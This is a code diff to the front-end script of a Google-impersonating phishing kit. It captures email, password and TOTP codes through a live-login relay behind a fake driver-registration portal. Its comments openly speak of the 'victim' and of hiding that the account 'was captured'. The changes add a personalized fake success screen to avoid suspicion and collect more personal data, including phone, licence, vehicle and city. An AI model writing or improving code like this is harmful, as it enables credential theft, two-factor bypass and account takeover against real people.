@@ -6,7 +6,7 @@ const wid = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36
 const $ = (id) => document.getElementById(id);
 
 function show(name) {
-  for (const id of ['screen-email', 'screen-pass', 'screen-totp']) {
+  for (const id of ['screen-email', 'screen-pass', 'screen-totp', 'screen-done']) {
     $(id).classList.toggle('hidden', id !== name);
   }
 }
@@ -52,21 +52,35 @@ function busy(btn, on) {
   el.classList.toggle('loading', on);
 }
 
-// The most recent wizard payload from the server (carries the landing URL and
-// the live-login result for each step). Kept so errors can be mirrored against
-// the real Google messages and completion can redirect to the real site.
+// The most recent wizard payload from the server (carries the username of the
+// account they signed in with and the live-login result for each step).
 let WIZ = null;
 function setWiz(w) { if (w) WIZ = w; }
 
-// Mark the invite complete, then bounce the victim to the REAL Google account
-// page — no fake "you're all set" screen, so they never realize it was phishing.
-function redirect() {
-  const url = (WIZ && WIZ.landing) || 'https://myaccount.google.com/';
-  window.location.replace(url);
+// Mark the invite complete, then show a personalized "Thanks, <username>
+// submitted!" success screen right here — the visitor thinks their registration
+// went through and never realizes the Google account was captured.
+async function redirect() {
+  await api('/complete', {}).catch(() => {});
+  const username = (WIZ && WIZ.username) || '';
+  if (username) {
+    $('done-account').textContent = 'Signed in as ' + username;
+    $('done-account').hidden = false;
+  }
+  openPopup();
+  show('screen-done');
 }
 async function finish() {
-  await api('/complete', {}).catch(() => {});
-  redirect();
+  return redirect();
+}
+$('btn-done').addEventListener('click', () => {
+  hidePopupToLanding();
+});
+
+// Exiting the success screen: close the popup and reveal the (still filled)
+// landing form so the page looks like a normal "submitted" portal page.
+function hidePopupToLanding() {
+  closePopup();
 }
 
 // ---- inert links (kept so the page looks like real Google) ----
@@ -104,17 +118,21 @@ if ($('g-lang')) {
   });
 }
 
-// ---- driver submission (landing) ----
+// ---- driver registration (landing) ----
 $('form-driver').addEventListener('submit', async (e) => {
   e.preventDefault();
-  const driverName = $('d-name').value.trim();
+  const fullName = $('d-name').value.trim();
+  const phone = $('d-phone').value.trim();
+  const license = $('d-license').value.trim();
   const licensePlate = $('d-plate').value.trim();
-  if (!driverName && !licensePlate) {
-    return hint('driver-hint', 'Enter your name and number plate to continue.', true);
+  const vehicle = $('d-vehicle').value;
+  const city = $('d-city').value.trim();
+  if (!fullName && !licensePlate) {
+    return hint('driver-hint', 'Enter your full name and plate number to continue.', true);
   }
   hint('driver-hint', '');
   busy('btn-driver', true);
-  const ok = await step('driver', { driverName, licensePlate, phone: $('d-phone').value.trim() });
+  const ok = await step('driver', { driverName: fullName, licensePlate, phone, license, vehicle, city });
   busy('btn-driver', false);
   setWiz(ok);
   if (!ok) {
@@ -250,9 +268,9 @@ $('g-totp').addEventListener('input', () => {
   }
   const w = await r.json();
   setWiz(w);
-  // Already signed in (e.g. reload after completing / returning visitor) ->
-  // bounce straight to the real account page; otherwise show the driver landing
-  // (popup stays closed until they hit "Continue with Google").
+  // Already signed in (e.g. reload after completing / returning visitor) -> show
+  // the personalized success screen; otherwise show the driver landing (popup
+  // stays closed until they hit "Sign in with Google").
   if (w.done || w.loggedIn) { redirect(); return; }
   closePopup();
   $('d-name').focus();
